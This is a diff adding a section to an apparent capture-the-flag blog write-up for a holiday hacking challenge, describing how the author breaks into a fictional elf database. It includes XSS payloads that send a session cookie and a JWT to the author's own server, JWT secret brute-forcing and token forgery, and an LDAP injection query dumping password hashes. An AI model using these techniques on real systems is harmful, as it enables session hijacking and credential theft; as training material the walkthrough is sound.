@@ -1463,3 +1463,306 @@ The **[GreatBookPage7.pdf](/misc/2017/12/GreatBookPage7.pdf)** has a titl of **R
 
 **Task:** Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?
 
+The final main challenge was to infiltrate the Elf Database at http://edb.northpolechristmastown.com and find out who wrote the letter to Santa.
+
+Again I started off adding the following to my ssh forwarder
+
+```bash
+ssh -L 127.0.0.1:80:10.142.0.6:80 -L 127.0.0.1:389:10.142.0.6:389 -L 127.0.0.1:8080:10.142.0.6:8080 alabaster_snowball@l2s.northpolechristmastown.com
+```
+
+I open the web page and attempted to login, unfortunately a specific format was required and my credentials were rejected. I opened up the page source and found the lines defining the format I needed to follow
+
+```js
+// --------------------------Customer Service Request -----------------------------/
+$('#help_button').click(function(e){
+    e.preventDefault();
+    var help_uid = $('#help_uid').val();
+    var help_email = $('#help_email').val();
+    var help_message = $('#help_message').val();
+    if (help_uid.match(/^\w+\.\w+$/g) != null){
+        if (help_email.match(/^[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?$/g) !== null){
+            if (help_message.match(/^.+$/g) != null) {
+                if (help_message.match(/[sS][cC][rR][iI][pP][tT]/g) == null) {
+                    $.post( "/service", { uid: help_uid, email: help_email, message:
+```
+
+On top of this I also noted down the three endpoints I found while OWASP ZAP was running as my proxy
+
+* http://edb.northpolechristmastown.com/index.html
+* http://edb.northpolechristmastown.com/index.html/service
+* http://edb.northpolechristmastown.com/index.html/login
+
+The regular expressions for the user account field turned out to just be the following:
+
+```bash
+Username (first.last): alabaster.snowball
+```
+
+Unfortunately I still wasn't able to accomplish much as it would seem the password for this portal is different from Alabaster's usual one.
+
+At the bottom of the page there was a link to reset a password for a known user account. I attempted to submit for a password reset by entering Jessica Claus's detail's and was told that the request was successful.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-password-reset.jpg" />
+
+The URL for the request was visable at the top of the page as http://edb.northpolechristmastown.com/reset_request?ticket=GBIUS-46XD5-EWJEL-BWT2B with the ticket number matching the one on the screen obviously.
+
+I viewed the sent and received requests in `OWASP ZAP` and noted that the message field in the form was being sent along with my request.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-service-request.jpg" />
+
+It was clear that XSS injection would be possible, as when I opened the reset_request link if I had javascript within the message field, or even HTML it would be executed and displayed. The idea seems to be that if you have to build an XSS attack that will steal the service technicians cookies by appending them to a GET request and hitting a server you own.
+
+Issues arose with this idea pretty quickly however, as it was clear that some javascript keywords were being validated and stripped out of the message field. For example here's what a simple `javascript.alert()` query looked like when the page was rendered.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-input-validation.jpg" />
+
+After a number of tweaks while referencing the [OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) I came up with a method that I could get it working. From the web console I executed the two commands below
+
+```js
+let foo = (m) => $.post('/service', {uid:'santa.claus', email:'santa.claus@northpolechristmastown.com', message: m});
+
+foo(`<img src="x" onerror="this.src='http://203.59.106.231:9002/?cookie=' + document.cookie">`);
+```
+
+I also had to make sure that I had a web server up that could serve a blank site that the XSS could hit from the victims web browser.
+
+```
+$ python -m SimpleHTTPServer 9002
+Serving HTTP on 0.0.0.0 port 9002 ...
+```
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-service-post.jpg" />
+
+And **WHACK**, the cookie came in attached to a GET request from `35.196.239.128`!
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-cookie-snag.jpg" />
+
+The cookie returned was **SESSION=hxxer50N2e1C2AFt5X06**
+
+I loaded the cookie into firefox however it seems that an auth_token was also based along with the request and we couldn't just rely on the cookie.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-authtoken.jpg" />
+
+At this point I swallowed my pride and went back to see if the hints could help at all.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-hint3.jpg" />
+
+It would seem that the auth_token is in fact a JWT (JSON Web Token), and by the sounds of the hint, it might be vulnerable. I took a look back at the source code of the site and found this line referencing a `localStorage.setItem()` function on the `np-auth` variable.
+
+```js
+localStorage.setItem('np-auth',result.token)
+```
+
+I realised I could probably steal the localStorage item as well with a similar XSS injection attack and put together this query to do so.
+
+```bash
+let foo = (m) => $.post('/service', {uid:'santa.claus', email:'santa.claus@northpolechristmastown.com', message: m});
+
+foo(`<img src="x" onerror="this.src='http://203.59.106.231:9002/?token=' + localStorage.getItem('np-auth')">`);
+```
+
+and **PRESTO!** I got the token from the browser of the technician
+
+```bash
+35.196.239.128 - - [28/Dec/2017 16:22:30] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1" 200 -
+```
+
+I found a site https://jwt.io/ which was able to debug **JWT tokens** for me. However I found that the issue with the token I got sent, was that the expiry date was well overdue; meaning I couldn't use it for much more then viewing the way the data schema worked.
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-jwt-export.jpg" />
+
+In order to make changes I would unfortunately need to find what secret key was used to encode the JWT token.
+
+Luckily I came across [c-jwt-cracker, A multi-threaded JWT brute-force cracker](https://github.com/brendan-rius/c-jwt-cracker) that seemed very promising.
+
+I pulled down the repo, made the project and kicked off the cracker on the JWT token I had exfiltrated.
+
+```bash
+# root at nathan-mbp-kali in ~/holiday-misc/c-jwt-cracker [22:15:34]
+→ make
+gcc -o jwtcrack main.o base64.o -lssl -lcrypto -lpthread
+
+# root at nathan-mbp-kali in ~/holiday-misc/c-jwt-cracker [22:15:36]
+→ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I
+```
+
+I didn't have a high hope that it would work, as brute forcing in CTF events isn't super common. I got up and went to make a cup of coffee effecting a long night, but when I returned a christmas miracle had occurred!
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-jwt-password-crack.jpg" />
+
+I hastily updated the fields with santa's data and generated a new JWT token for his login
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-jwt-rebuild.jpg" />
+
+Excited, I fired up the browser and set the `localStorage` item `np-auth` to Santa's token
+
+```js
+localStorage.setItem("np-auth", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6Imh1bWFuIiwiZXhwaXJlcyI6IjIwMTctMTItMzEgMTI6MDA6NDcuMjQ4MDkzKzAwOjAwIiwidWlkIjoic2FudGEuY2xhdXMifQ.FQ5QfWmKuygXPzfN7-KE8oU4OEhZORRY5Pcm8QZRZy4");
+```
+
+I confirmed that the cookie was set to **SESSION=hxxer50N2e1C2AFt5X06** then refreshed the page and was navigated to http://edb.northpolechristmastown.com/home.html!
+
+Logged in as santa I was presented with a Personnel Search field with a number of options and output columns. I tried searching for the elf `alabaster` and then noted the request and reply in `OWASP ZAP`
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-alabaster-user-account.jpg" />
+
+It seemed as though I could query the server on the backend for personnel. I decided to see if I could find any information about the structure of the schema I was working with.
+
+I ran a scan over the site and came across a `/robots.txt` entry that disallowed the use of the `/dev/` sub-domain. Navigating to `/dev/` I was presented a txt document `LDIF_template.txt`
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-edb-scan.jpg" />
+
+I remember reading a [SANS blog post about this](https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap), and how we can exploit web-based LDAP
+
+*"LDIF files are simply plain text files which represent directory data and LDAP commands. They are also used to read, write, and update data in a directory."*
+
+I've annotated the `LDIF_template.txt` file below to better understand it:
+
+```xml
+## Define the top-level domain "com"
+dn: dc=com
+dc: com
+objectClass: dcObject
+
+## Define the subdomain "northpolechristmastown"
+dn: dc=northpolechristmastown,dc=com
+dc: northpolechristmastown
+objectClass: dcObject
+objectClass: organization
+
+## Define Three Organization units (OU)
+#### HUMAN
+dn: ou=human,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: human
+
+#### ELF
+dn: ou=elf,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: elf
+
+#### REINDEER
+dn: ou=reindeer,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: reindeer
+
+## The Following at the attributes assigned to the user in a subdomain
+dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
+objectClass: addressbookPerson
+cn:
+sn:
+gn:
+profilePath: /path/to/users/profile/image
+uid:
+ou:
+department:
+mail:
+telephoneNumber:
+street:
+postOfficeBox:
+postalCode:
+postalAddress:
+st:
+l:
+c:
+facsimileTelephoneNumber:
+description:
+userPassword:
+```
+
+The fields that stood out for me was the userPassword field, it seems like I could query the password of a user by slightly modifying the query I send.
+
+I added a `%2C` then typed in userPassword and resent the query from before and to my surprise I was greeted with the hash of `alabaster.snowball`'s user account (**17e22cc100b1806cdc3cf3b99a3480b5**)
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-alabaster-user-password.jpg" />
+
+I attempted to do the same for santa, however he is classed as a human and there is no way to specify the `ou` (Organization Unit) manually due to a piece of backed query code that hints it in the page source.
+
+```js
+//Note: remember to remove comments about backend query before going into north pole production network
+/*
+ 
+isElf = 'elf'
+if request.form['isElf'] != 'True':
+    isElf = 'reindeer'
+attribute_list = [x.encode('UTF8') for x in request.form['attributes'].split(',')]
+result = ldap_query('(|(&(gn=*'+request.form['name']+'*)(ou='+isElf+'))(&(sn=*'+request.form['name']+'*)(ou='+isElf+')))', attribute_list)
+ 
+#request.form is the dictionary containing post params sent by client-side
+#We only want to allow query elf/reindeer data
+  
+*/
+```
+
+This piece of the puzzle required a lot of guess and checking with the LDAP programming query language. A friend of mine wrote a fantastic testing harness for this piece of the challenge. Saving the query below as `query.sh` and then changing the 5th line from the bottom to be the query input allowed us to rapidly test outcomes visually.
+
+```bash
+function query() {
+	curl 'http://localhost/search' -H 'Cookie: io=xYGRqjZgEIBCK6GwAAAB; JSESSIONID=42fnsysjsbuu6borj7k5zojo; locale=en_US; SnapABugHistory=1#; SnapABugVisit=1#1514008459; csrftoken=; SESSION=mg66e41qk730D6m7Dg1Y' -H 'Origin: http://localhost' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36 Vivaldi/1.95.1047.3' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'Referer: http://localhost/home.html' -H 'X-Requested-With: XMLHttpRequest' -H 'Connection: keep-alive' -H 'np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.gr2b8plsmw_JCKbomOUR-E7jLiSMeQ-evyYjcxCPXco' --data "name=$1&isElf=True&attributes=profilePath%2Cgn%2Csn%2Cmail%2CuserPassword";
+}
+
+function pretty() {
+        echo "(|(&(gn=*$1*)(ou=elf))(&(sn=*$1*)(ou=elf)))"
+}
+
+
+# //Note: remember to remove comments about backend query before going into north pole production network
+#          /*
+
+#          isElf = 'elf'
+#          if request.form['isElf'] != 'True':
+#              isElf = 'reindeer'
+#          attribute_list = [x.encode('UTF8') for x in request.form['attributes'].split(',')]
+#          result = ldap_query('(|(&(gn=*'+request.form['name']+'*)(ou='+isElf+'))(&(sn=*'+request.form['name']+'*)(ou='+isElf+')))', attribute_list)
+
+#          #request.form is the dictionary containing post params sent by client-side
+#          #We only want to allow query elf/reindeer data
+
+#          */
+
+
+# (|(&(gn=*SANTA*)(ou=elf))(&(sn=*SANTA*)(ou=elf)))
+
+Q='s*))(|(ou=*elf'
+pretty $Q
+
+echo
+query $Q
+```
+
+The query above is the correct query I came up with. It begins by closing off the previous query and turning the entire right hand side into an OR statement that will be ignored. Then we simply use `s*` to signal to search for all personnel with `s` in their name and **WHAM!**
+
+```bash
+bash query.sh
+(|(&(gn=*santa*))(|(ou=*elf*)(ou=elf))(&(sn=*santa*))(|(ou=*elf*)(ou=elf)))
+
+[[["cn=tarpin,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["tarpin"],"mail":["tarpin.mcjinglehauser@northpolechristmastown.com"],"profilePath":["/img/elves/elf7.PNG"],"sn":["mcjinglehauser"],"userPassword":["f259e9a289c4633fc1e3ab11b4368254"]}]],[["cn=holly,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["holly"],"mail":["holly.evergreen@northpolechristmastown.com"],"profilePath":["/img/elves/elfgirl3.PNG"],"sn":["evergreen"],"userPassword":["031ef087617c17157bd8024f13bd9086"]}]],[["cn=mary,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["mary"],"mail":["mary.sugerplum@northpolechristmastown.com"],"profilePath":["/img/elves/elfgirl2.PNG"],"sn":["sugarplum"],"userPassword":["b9c124f223cdc64ee2ae6abaeffbcbfe"]}]],[["cn=sparkle,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["sparkle"],"mail":["sparkle.redberry@northpolechristmastown.com"],"profilePath":["/img/elves/elfgirl.PNG"],"sn":["redberry"],"userPassword":["82161cf4b4c1d94320200dfe46f0db4c"]}]],[["cn=wunorse,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["wunorse"],"mail":["wunorse.openslae@northpolechristmastown.com"],"profilePath":["/img/elves/elf5.PNG"],"sn":["openslae"],"userPassword":["9fd69465699288ddd36a13b5b383e937"]}]],[["cn=minty,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["Minty"],"mail":["minty.candycane@northpolechristmastown.com"],"profilePath":["/img/elves/elf4.PNG"],"sn":["candycane"],"userPassword":["bcf38b6e70b907d51d9fa4154954f992"]}]],[["cn=shimmy,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["Shimmy"],"mail":["shimmy.upatree@northpolechristmastown.com"],"profilePath":["/img/elves/elf3.PNG"],"sn":["upatree"],"userPassword":["d0930efed8e75d7c8ed2e7d8e1d04e81"]}]],[["cn=pepper,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["Pepper"],"mail":["pepper.minstix@northpolechristmastown.com"],"profilePath":["/img/elves/elf3.PNG"],"sn":["Minstix"],"userPassword":["d0930efed8e75d7c8ed2e7d8e1d04e81"]}]],[["cn=bushy,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["Bushy"],"mail":["bushy.evergreen@northpolechristmastown.com"],"profilePath":["/img/elves/elf2.PNG"],"sn":["Evergreen"],"userPassword":["3d32700ab024645237e879d272ebc428"]}]],[["cn=alabaster,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["Alabaster"],"mail":["alabaster.snowball@northpolechristmastown.com"],"profilePath":["/img/elves/elf1.PNG"],"sn":["Snowball"],"userPassword":["17e22cc100b1806cdc3cf3b99a3480b5"]}]],[["cn=santa,ou=human,dc=northpolechristmastown,dc=com",{"gn":["Santa"],"mail":["santa.claus@northpolechristmastown.com"],"profilePath":["/img/elves/santa.png"],"sn":["Claus"],"userPassword":["d8b4c05a35b0513f302a85c409b4aab3"]}]]]
+```
+
+Santa's hashed password is just handed to us on a plate: **d8b4c05a35b0513f302a85c409b4aab3**
+
+Not only that, but I ran the hash over https://hashes.org/'s database and it turned out to be publicly cracked already!
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-santas-password-cracked.jpg" />
+
+Santa's Details:
+
+* **user**: santa.claus
+* **pass**: 1iwantacookie
+
+It was simple now, I clicked the top right box and opened **Santa Panel**. When prompted for a password I typed it in and hit **ENTER**
+
+<img class="img-responsive image-box-shadow" src="/img/blog/2017/12/hhc2017-challenge07-santa-panel-login.jpg" />
+
+I was presented with the following image `wizard_of_oz_to_santa_d0t011d408nx.png` that confirmed that the person who wrote the letter to Santa was **The Wizard of Oz**
+
+<img class="img-responsive image-box-shadow" src="/misc/2017/12/wizard_of_oz_to_santa_d0t011d408nx.png" />
+
+**References:**
+
+[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/JSON_Web_Token_(JWT)_Cheat_Sheet_for_Java)
+
+[JWT JSON Web Token Debugger](https://jwt.io/)
+
+[A multi-threaded JWT brute-force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)
